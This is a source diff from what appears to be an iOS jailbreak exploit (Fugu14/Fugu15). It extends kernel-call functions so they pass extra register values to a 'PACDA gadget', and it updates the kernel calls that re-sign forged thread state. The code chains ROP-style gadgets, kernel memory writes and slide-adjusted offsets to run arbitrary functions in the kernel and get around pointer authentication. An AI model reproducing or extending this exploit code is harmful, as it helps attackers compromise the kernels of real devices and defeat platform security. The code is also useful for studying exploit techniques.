@@ -443,7 +443,7 @@ bool setupFugu14Kcall(void) {
     uint64_t str_x8_x9_gadget = SLIDE(gOffsets.str_x8_x9_gadget);
     uint64_t exception_return_after_check = SLIDE(gOffsets.exception_return_after_check);
     uint64_t brX22 = SLIDE(gOffsets.brX22);
-    kcall(SLIDE(gOffsets.ml_sign_thread_state), actContext, str_x8_x9_gadget /* pc */, CPSR_KERN_INTR_DIS /* cpsr */, exception_return_after_check /* lr */, 0 /* x16 */, brX22 /* x17 */, 0, 0);
+    kcall(SLIDE(gOffsets.ml_sign_thread_state), actContext, str_x8_x9_gadget /* pc */, CPSR_KERN_INTR_DIS /* cpsr */, exception_return_after_check /* lr */, 0 /* x16 */, brX22 /* x17 */, 0, 0, 0, 0);
     
     // Write register values
     pcidev_w64(actContext + offsetof(kRegisterState, pc),    str_x8_x9_gadget);
@@ -518,7 +518,7 @@ bool setupFugu14Kcall(void) {
     return true;
 }
 
-uint64_t Fugu14Kcall_onThread(Fugu14KcallThread *callThread, uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
+uint64_t Fugu14Kcall_onThread(Fugu14KcallThread *callThread, uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8, uint64_t a_x8, uint64_t a_x9) {
     // Restore signed state first
     kernwrite(callThread->actContext, &callThread->signedState, sizeof(kRegisterState));
     
@@ -556,6 +556,10 @@ uint64_t Fugu14Kcall_onThread(Fugu14KcallThread *callThread, uint64_t func, uint
     callThread->mappedState->x[6] = a7;
     callThread->mappedState->x[7] = a8;
     
+    // PACDA Gadget
+    callThread->mappedState->x[8] = a_x8;
+    callThread->mappedState->x[9] = a_x9;
+    
     // Reset flag
     gUserReturnDidHappen = 0;
     
@@ -581,13 +585,13 @@ uint64_t Fugu14Kcall_onThread(Fugu14KcallThread *callThread, uint64_t func, uint
     return callThread->scratchMemoryMapped[0];
 }
 
-uint64_t Fugu14Kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
-    return Fugu14Kcall_onThread(&fugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
+uint64_t Fugu14Kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8, uint64_t a_x8, uint64_t a_x9) {
+    return Fugu14Kcall_onThread(&fugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8, a_x8, a_x9);
 }
 
-uint64_t kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {
+uint64_t kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8, uint64_t a_x8, uint64_t a_x9) {
     if (fugu14KcallThread.inited) {
-        return Fugu14Kcall_onThread(&fugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
+        return Fugu14Kcall_onThread(&fugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8, a_x8, a_x9);
     }
     
     return kcall_on_thread(&fugu15ExploitThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
@@ -630,7 +634,7 @@ bool kexec_on_new_thread(kRegisterState *kState, thread_t *thread) {
     kernwrite((uint64_t) &threadACTContext->x[0], &kState->x[0], sizeToWrite);
     
     // Resign it
-    kcall(SLIDE(gOffsets.ml_sign_thread_state), (uint64_t) threadACTContext, kState->pc, kState->cpsr, kState->lr, kState->x[16], kState->x[17], 0, 0);
+    kcall(SLIDE(gOffsets.ml_sign_thread_state), (uint64_t) threadACTContext, kState->pc, kState->cpsr, kState->lr, kState->x[16], kState->x[17], 0, 0, 0, 0);
     
     // Resume
     thread_resume(*thread);
